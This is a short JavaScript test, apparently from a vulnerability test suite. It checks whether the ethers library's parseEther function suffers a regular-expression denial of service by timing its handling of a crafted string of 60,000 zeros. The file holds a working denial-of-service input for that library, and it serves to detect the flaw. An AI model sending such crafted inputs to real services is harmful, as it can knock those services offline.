// test("ReDos in ethers", () => {
  const measureTime = require("../utils").measureTime;
  const { ethers } = require("ethers");
  let attack_str = "a" + " ".repeat(33000) + "a";
  let t = measureTime(function () {
    try {
      ethers.utils.parseEther("1." + "0".repeat(60000) + "1");
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
